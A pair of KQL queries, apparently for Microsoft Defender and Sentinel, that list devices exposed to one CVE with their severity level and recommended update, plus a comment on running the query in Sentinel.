DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-48030")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-48030")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc
